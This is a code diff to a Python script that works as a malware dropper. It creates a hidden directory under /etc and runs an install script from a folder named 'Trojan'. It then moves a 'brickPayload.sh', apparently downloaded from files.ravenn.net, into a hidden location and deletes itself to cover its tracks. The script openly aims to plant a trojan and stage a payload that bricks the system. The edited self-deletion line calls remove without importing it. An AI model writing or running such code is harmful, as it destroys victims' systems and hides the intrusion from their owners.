@@ -1,5 +1,6 @@
 import os
 import subprocess
+from sys import argv
 def main():
     directory = os.getcwd()
     os.system("mkdir /etc/.a")
@@ -9,7 +10,7 @@ def main():
     os.system("chmod +x /etc/.a/Trojan/install.sh")
     os.system("bash /etc/.a/Trojan/install.sh")
     print("Install complete. Preping brick payload.")
-    os.system("mv /etc/.a/horror/files.ravenn.net/horror/brickPayload.sh /etc/.music")
+    os.system("mv /etc/.a/files.ravenn.net/horror/brickPayload.sh /etc/.music")
     print("Total completion. Goodbye")
-    os.system("rm {directory}/get.py")
+    remove(argv[0])
 main()
